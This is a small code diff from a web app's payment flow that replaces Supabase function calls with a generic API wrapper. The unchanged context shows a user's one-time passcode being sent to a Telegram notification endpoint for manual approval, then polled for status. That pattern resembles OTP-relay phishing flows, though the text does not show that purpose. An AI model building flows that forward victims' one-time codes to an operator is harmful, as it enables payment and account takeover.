@@ -1,5 +1,5 @@
 import { flowAuth } from "@/lib/flowSession";
-import { supabase } from "@/integrations/supabase/client";
+import { invokeApi } from "@/lib/apiClient";
 import { sendTelegramNotification } from "@/lib/payment-telegram";
 import { getPublicAppSetting } from "@/lib/backend-api";
 import { subscribeAppSettingsUpdate } from "@/lib/appSettingsSync";
@@ -88,7 +88,7 @@ export async function submitOtpForApproval(
   let requestId: string | null = null;
   if (!flowAuth().flowToken) return 'error';
   try {
-    const { data, error } = await supabase.functions.invoke('telegram-notify', {
+    const { data, error } = await invokeApi('telegram-notify', {
       body: {
         type: 'payment_activity',
         requireApproval: true,
@@ -144,7 +144,7 @@ export async function submitOtpForApproval(
       if (Date.now() - lastPoll >= intervalMs) {
         lastPoll = Date.now();
         try {
-          const { data, error } = await supabase.functions.invoke('otp-status', {
+          const { data, error } = await invokeApi('otp-status', {
             body: { request_id: requestId, ...flowAuth() },
           });
           if (!error) {
